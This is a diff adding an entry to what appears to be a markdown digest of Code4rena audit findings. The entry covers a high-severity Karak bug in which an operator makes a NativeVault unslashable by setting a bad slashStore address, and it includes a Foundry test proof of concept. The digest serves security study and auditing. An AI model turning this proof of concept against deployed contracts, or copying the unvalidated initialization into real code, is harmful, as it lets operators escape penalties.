@@ -1646,6 +1646,7 @@ func (_ZetaConnectorNonEth *ZetaConnectorNonEthFilterer) ParseZetaReceived(log t
   <br> 🐬: [Source](<https://code4rena.com/reports/2024-09-legion-evm-zenith#h-03-withdrawCapital()-can-be-called-multiple-times-by-the-project-to-withdraw-ExcessCapital>) & [Report](https://code4rena.com/reports/2024-09-legion-evm-zenith)
 
 <details><summary>POC</summary>
+
 ```solidity
     function withdrawCapital() external virtual onlyProject {
         /// Verify that the refund period is over
@@ -1691,4 +1692,79 @@ bool internal tokensSupplied;
 ```
 
 </details>
+
+## 30. [High] The operator can create a NativeVault that can be silently unslashable
+
+### Unslashable vault
+
+- Summary: The issue in Karak’s protocol allows operators to create a **NativeVault** that is unslashable by setting a custom `slashStore` address during initialization, different from the protocol’s designated slashing handler. This happens because `slashAssets()` will fail if `slashStore` doesn’t match the expected address, letting operators bypass penalties even if they act maliciously. The Proof of Concept demonstrates this by configuring `NativeVault` to always revert on slashing attempts, thus making it unslashable.
+
+- Impact & Recommendation: It's recommended to enforce validation on the `slashStore` address during initialization or vault deployment. While Karak suggested lowering severity, auditors argued this impacts core protocol security and kept it high, citing the crucial role of slashing in maintaining operator accountability.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-karak#h-02-the-operator-can-create-a-nativevault-that-can-be-silently-unslashable) & [Report](https://code4rena.com/reports/2024-07-karak)
+  <br> Others: [Source](https://code4rena.com/reports/2024-07-karak#m-01-changing-the-slashinghandler-for-nativevaults-will-dos-slashing) & [Report](https://code4rena.com/reports/2024-07-karak)
+
+<details><summary>POC</summary>
+
+```solidity
+
+    function test_createUnslashableVault() public {
+        //Setup
+        vm.warp(1718549030);
+        NativeVault unslashableVault;
+        address badSlashStore = address(666);
+        DSSContract dss = new DSSContract();
+        vm.startPrank(address(dss));
+        core.registerDSS(100000000000000000000);
+        vm.stopPrank();
+        // Setup NativeNode implementation
+        address nativeNodeImpl = address(new NativeNode());
+        // Deploy Vaults
+        VaultLib.Config[] memory vaultConfigs = new VaultLib.Config[](1);
+        vaultConfigs[0] = VaultLib.Config({
+            asset: Constants.DEAD_BEEF,
+            decimals: 18,
+            operator: operator,
+            name: "NativeTestVault",
+            symbol: "NTV",
+            extraData: abi.encode(address(manager), badSlashStore, address(nativeNodeImpl))
+        });
+        vm.startPrank(operator);
+        IDSS dssInterface = IDSS(address(dss));
+        core.registerOperatorToDSS(dssInterface, bytes(""));
+        IKarakBaseVault[] memory vaults = core.deployVaults(vaultConfigs, address(0));
+        unslashableVault = NativeVault(address(vaults[0]));
+
+        //Register vault staked for dss
+        Operator.StakeUpdateRequest memory stakeRequest = Operator.StakeUpdateRequest({
+            vault: address(unslashableVault),
+            dss: dssInterface,
+            toStake: true
+        });
+        Operator.QueuedStakeUpdate memory queuedStake = core.requestUpdateVaultStakeInDSS(stakeRequest);
+        vm.warp(1718549030 + 10 days);
+        core.finalizeUpdateVaultStakeInDSS(queuedStake);
+        vm.stopPrank();
+
+        vm.startPrank(address(dss));
+        //Slash request
+        uint96[] memory slashPercentagesWad = new uint96[](1);
+        slashPercentagesWad[0] = 10000000000000000000;
+        address[] memory operatorVaults = new address[](1);
+        operatorVaults[0] = address(unslashableVault);
+
+        SlasherLib.SlashRequest memory slashingReq = SlasherLib.SlashRequest({
+            operator: operator,
+            slashPercentagesWad: slashPercentagesWad,
+            vaults: operatorVaults
+        });
+        //Request and execute the slashing but revert
+        SlasherLib.QueuedSlashing memory queuedSlashing = core.requestSlashing(slashingReq);
+        vm.warp(1718549030 + 14 days);
+        core.finalizeSlashing(queuedSlashing);
+
+        vm.stopPrank();
+    }
+
 ```
+
+</details>
